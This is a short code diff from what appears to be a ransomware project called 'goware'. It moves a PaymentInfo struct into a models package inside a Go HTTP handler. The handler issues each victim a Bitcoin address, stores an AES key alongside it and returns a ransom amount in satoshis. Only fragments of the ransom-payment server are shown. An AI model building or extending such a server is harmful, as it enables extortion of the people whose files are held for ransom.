@@ -20,14 +20,12 @@ import (
 	"github.com/btcsuite/btcd/btcutil"
 	"github.com/btcsuite/btcd/chaincfg"
 	"github.com/tkanos/gonfig"
+		
+		"github.com/nikola43/goware/models"
+
 )
 
 var Key rsa.PrivateKey
-
-type PaymentInfo struct {
-	Address string
-	Amount  string
-}
 
 func FromBase10(base10 string) *big.Int {
 	i, ok := new(big.Int).SetString(base10, 10)
@@ -161,7 +159,7 @@ func handler(w http.ResponseWriter, req *http.Request) {
 			address.EncodeAddress(),
 			aes_key,
 		}
-		json.NewEncoder(w).Encode(PaymentInfo{
+		json.NewEncoder(w).Encode(models.PaymentInfo{
 			victims[id].address,
 			strconv.Itoa(configuration.Satoshi),
 		})
